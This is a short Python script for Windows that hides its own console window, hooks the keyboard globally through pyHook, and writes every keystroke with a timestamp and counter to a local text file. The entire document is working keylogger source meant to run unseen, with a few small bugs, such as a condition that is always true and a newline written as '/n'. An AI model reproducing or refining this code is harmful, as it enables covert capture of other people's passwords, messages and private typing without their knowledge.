import win32api
import win32console
import win32gui
import pythoncom,pyHook
import time
 
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
start=time.time()

filename = r"C:\Users\AlexandrePoulin\Documents\cool python programs\output.txt"

f=open(filename,'w')
f.write("")
f.close()
counter = 0
def OnKeyboardEvent(event):
    global counter
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
        #open output.txt to read current keystrokes
        f=open(filename,'r+')
        buffer=f.read()
        f.close()
        #open output.txt to write current + new keystrokes
        f=open(filename,'w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
        buffer+=keylogs+" "+str(time.time()-start)+" "+ str(counter)+'\n'
        counter+=1
        f.write(buffer)
        f.close()

# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
